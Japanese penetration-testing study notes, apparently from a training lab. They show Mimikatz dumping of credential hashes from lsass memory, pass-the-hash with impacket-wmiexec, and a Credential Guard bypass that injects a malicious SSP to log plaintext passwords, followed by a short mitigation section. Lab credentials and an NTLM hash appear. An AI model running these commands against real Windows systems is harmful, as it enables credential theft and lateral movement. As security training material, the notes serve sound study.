Domaiハッシュなどの認証情報はlsass.exeのプロセスのメモリに保存されるため、Mimikatz等で取得可能

# ドメインユーザのhash取得
ローカルユーザ上でメモリ内のドメインユーザのhash取得の流れ

Kali
```bash
xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.113.246 /dynamic-resolution
# このアクセスによりメモリ上にHashが残る
# Sign-Out
```

```bash
# ローカルアカウントでログイン
xfreerdp /u:"offsec" /p:"lab" /v:192.168.113.246 /dynamic-resolution
```

RemoteDesktop先のVictim
```powershell
# 管理者としてPowershellを起動
Get-ComputerInfo
# DeviceGuardSecurityServicesRunningのCredentialGuardが有効になっていないことを確認
# Mimikatzをインストール
.\Mimikatz.exe
```

```Powershell
privilege::debug
sekurlsa::logonpasswords
# 以下ローカル、ドメイン両方のHashが出力される
```

kali
```bash
impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.113.248
```

---
## 緩和策
### VBS
- 最新のCPUが提供するハードウェア仮想化機能を活用するソフトウェア技術
- オペレーティングシステムの信頼の基盤となる安全なメモリ領域の作成と分離など
- 物理ハードウェア上でハイパーバイザー(Hyper-V)を実行
### VSM
- メモリ内に隔離された領域を作成し、オペレーティングシステムはそこに機密性の高い情報やシステムセキュリティ資産を格納
- これらの領域には、カーネルよりも高い権限で動作するハイパーバイザーを介してのみアクセスでき、たとえ権限をSYSTEMに昇格させたとしても、これらの領域にアクセスすることはできない
---
# Credential Guard回避策
- CredentialGuard 非ローカルユーザーのみを保護

RemoteDesktop先のVictim
```powershell
.\mimikatz.exe

privilege::debug

# 悪意のあるSSPの挿入
misc::memssp
# 事後ユーザがログインすると、プレインのパスワードがC:\Windows\System32\mimilsa.logに保存される

type C:\Windows\System32\mimilsa.log
```
